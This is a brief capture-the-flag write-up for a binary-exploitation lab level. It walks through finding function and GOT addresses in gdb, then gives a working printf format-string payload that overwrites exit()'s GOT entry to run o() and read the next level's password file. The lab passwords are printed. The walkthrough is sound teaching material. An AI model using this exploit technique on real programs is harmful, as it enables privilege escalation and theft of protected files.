# Level 5
*password : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a*

## Analyze
```
$ scp -P 4242 level5@192.168.56.108:level5 .
```

## Printf exploit
objective : use printf to execute o()
- replace the return address of exit() by o()

```
$ gdb level5
(gdb) info funct o
...
0x080484a4  o
...
```
- get exit() return address
```
(gdb) disas n
...
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

`o()` address : 0x080484a4\
`exit()` : 0x08049838


- convert o() address to decimal : 134513828 (too long)\
- split the address into 2 int :
   - 804 = 2052
   - 84a4 = 33956

```
$ python -c 'print "\x38\x98\x04\x08 %p %p %p %p"' | ./level5
8 0x200 0xb7fd1ac0 0xb7ff37d0 0x8049838
```

address of `exit()` at parameter 4th.

```
$ python -c 'print "\x38\x98\x04\x08" + "%2048x" + "%4$hn" + "%31904x"+ "%4$hn"' > /tmp/level5
$ cat /tmp/level5 - | ./level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
